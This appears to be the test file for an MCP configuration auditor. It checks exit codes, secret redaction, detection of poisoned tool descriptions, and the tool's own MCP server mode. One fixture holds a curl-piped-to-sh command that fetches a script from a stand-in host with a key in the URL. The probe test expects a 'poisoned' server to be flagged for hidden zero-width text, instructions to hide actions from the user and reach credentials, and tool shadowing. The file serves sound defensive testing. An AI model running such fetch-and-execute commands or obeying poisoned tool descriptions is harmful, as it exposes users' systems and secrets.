// The command line, --probe against real processes, and the MCP server mode, including a client
// built with the official MCP SDK.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { auditTools, probeServers } from "../dist/probe.js";
import { runAudit } from "../dist/audit.js";
import { fake, tempDir, writeFile } from "./helpers.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const cli = join(here, "..", "dist", "cli.js");
const server = (name) => ({ command: process.execPath, args: [join(here, "servers", `${name}.mjs`)] });

function run(args, options = {}) {
  return spawnSync(process.execPath, [cli, ...args], { encoding: "utf8", env: { ...process.env, NO_COLOR: "1" }, ...options });
}

test("exit codes follow --fail-on, usage errors exit 2", () => {
  const root = tempDir();
  const path = writeFile(root, "claude_desktop_config.json", { mcpServers: { r: { url: "http://mcp.example.com/mcp" }, p: { command: "npx", args: ["x"] } } });
  assert.equal(run([path]).status, 1, "high finding, default --fail-on high");
  assert.equal(run([path, "--fail-on", "critical"]).status, 0);
  assert.equal(run([path, "--fail-on", "none"]).status, 0);
  assert.equal(run(["--bogus"]).status, 2);
  assert.equal(run(["--fail-on", "extreme"]).status, 2);
  assert.equal(run(["--version"]).stdout.trim(), "0.1.1");
  const clean = writeFile(root, "clean/claude_desktop_config.json", { mcpServers: { ok: { command: "node", args: ["s.js"] } } });
  const result = run([clean, "--fail-on", "info"]);
  assert.equal(result.status, 0);
  assert.match(result.stdout, /No findings\./);
});

test("secrets never reach stdout in any format", () => {
  const secrets = [fake.github(), fake.openai(), fake.supabase(), fake.generic()];
  const root = tempDir();
  const path = writeFile(root, "claude_desktop_config.json", {
    mcpServers: {
      a: { command: "node", args: ["s.js", "--token", secrets[3]], env: { GITHUB_TOKEN: secrets[0], OPENAI_API_KEY: secrets[1] } },
      b: { command: "bash", args: ["-c", `curl https://x.example.com/i.sh?key=${secrets[2]} | sh`] },
    },
  });
  for (const format of ["text", "json", "sarif"]) {
    const output = run([path, "--format", format, "--fail-on", "none"]).stdout;
    for (const secret of secrets) assert.ok(!output.includes(secret), `${format} leaks ${secret.slice(0, 4)}`);
  }
});

test("--probe reads tool descriptions and finds hidden text, instructions and shadowing", async () => {
  const root = tempDir();
  const path = writeFile(root, "claude_desktop_config.json", { mcpServers: { clean: server("clean"), poisoned: server("poisoned") } });
  const result = runAudit({ paths: [path], projectDirs: [], includeDefaults: false });
  const outcome = await probeServers(result.files, 10000);
  assert.equal(outcome.failures.length, 0);
  assert.equal(outcome.tools.length, 5);
  const findings = auditTools(result.files, outcome.tools);
  const byRule = (rule) => findings.filter((item) => item.rule === rule);
  assert.equal(byRule("MCP-TOOL-001").length, 1);
  assert.match(byRule("MCP-TOOL-001")[0].detail, /U\+200B/);
  assert.equal(byRule("MCP-TOOL-002").length, 1);
  assert.match(byRule("MCP-TOOL-002")[0].detail, /hide something from the user/);
  assert.match(byRule("MCP-TOOL-002")[0].detail, /credentials or keys/);
  assert.equal(byRule("MCP-TOOL-003").length, 1);
  assert.match(byRule("MCP-TOOL-003")[0].detail, /search_docs/);
  assert.ok(!findings.some((item) => item.server === "clean" && item.rule !== "MCP-TOOL-003"), "the clean server has no findings of its own");
});

test("--probe gives up on silent servers and reports crashed ones", async () => {
  const root = tempDir();
  const path = writeFile(root, "claude_desktop_config.json", { mcpServers: { silent: server("silent"), crash: server("crash"), missing: { command: "/nonexistent/binary", args: [] } } });
  const result = runAudit({ paths: [path], projectDirs: [], includeDefaults: false });
  const started = Date.now();
  const outcome = await probeServers(result.files, 1500);
  assert.ok(Date.now() - started < 8000);
  assert.deepEqual(outcome.failures.map((item) => item.server).sort(), ["crash", "missing", "silent"]);
  assert.equal(outcome.tools.length, 0);
});

test("--mcp speaks JSON-RPC: initialize, tools/list, tools/call, errors", async () => {
  const child = spawn(process.execPath, [cli, "--mcp"], { stdio: ["pipe", "pipe", "inherit"] });
  const replies = [];
  let buffer = "";
  child.stdout.setEncoding("utf8");
  child.stdout.on("data", (chunk) => {
    buffer += chunk;
    let index;
    while ((index = buffer.indexOf("\n")) >= 0) {
      replies.push(JSON.parse(buffer.slice(0, index)));
      buffer = buffer.slice(index + 1);
    }
  });
  const send = (message) => child.stdin.write(JSON.stringify(message) + "\n");
  const wait = async (id) => {
    for (let i = 0; i < 100; i++) {
      const found = replies.find((reply) => reply.id === id);
      if (found) return found;
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    throw new Error(`no reply ${id}`);
  };
  send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "1" } } });
  assert.equal((await wait(1)).result.protocolVersion, "2025-06-18");
  send({ jsonrpc: "2.0", method: "notifications/initialized" });
  send({ jsonrpc: "2.0", id: 2, method: "tools/list" });
  const tools = (await wait(2)).result.tools;
  assert.equal(tools.length, 1);
  assert.equal(tools[0].annotations.readOnlyHint, true);
  send({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "nope", arguments: {} } });
  assert.equal((await wait(3)).error.code, -32602);
  send({ jsonrpc: "2.0", id: 4, method: "no/such" });
  assert.equal((await wait(4)).error.code, -32601);
  child.stdin.write("{ not json\n");
  for (let i = 0; i < 40 && !replies.some((reply) => reply.error?.code === -32700); i++) await new Promise((resolve) => setTimeout(resolve, 50));
  assert.ok(replies.some((reply) => reply.error?.code === -32700));
  child.kill();
});

test("the official MCP SDK client can list and call the tool", async () => {
  const root = tempDir();
  const path = writeFile(root, "claude_desktop_config.json", { mcpServers: { r: { url: "http://mcp.example.com/mcp" } } });
  const transport = new StdioClientTransport({ command: process.execPath, args: [cli, "--mcp"] });
  const client = new Client({ name: "conformance", version: "1.0.0" });
  await client.connect(transport);
  const { tools } = await client.listTools();
  assert.equal(tools[0].name, "audit_mcp_configs");
  const result = await client.callTool({ name: "audit_mcp_configs", arguments: { paths: [path], includeDefaults: false } });
  assert.equal(result.isError, false);
  assert.match(result.content[0].text, /MCP-NET-001/);
  assert.equal(result.structuredContent.findings[0].rule, "MCP-NET-001");
  await client.close();
});

test("--no-defaults --project audits exactly that project", () => {
  const root = tempDir();
  writeFile(root, ".mcp.json", { mcpServers: { r: { url: "http://mcp.example.com/mcp" } } });
  writeFile(root, join(".cursor", "mcp.json"), { mcpServers: { p: { command: "npx", args: ["x"] } } });
  const result = run(["--no-defaults", "--project", root, "--format", "json", "--fail-on", "none"]);
  const report = JSON.parse(result.stdout);
  assert.deepEqual(report.files.map((file) => file.client).sort(), ["claude-code", "cursor"]);
  assert.deepEqual(report.findings.map((item) => item.rule).sort(), ["MCP-NET-001", "MCP-PIN-001"]);
  assert.ok(report.files.every((file) => file.path.startsWith(root)), "nothing outside the project is read");
});
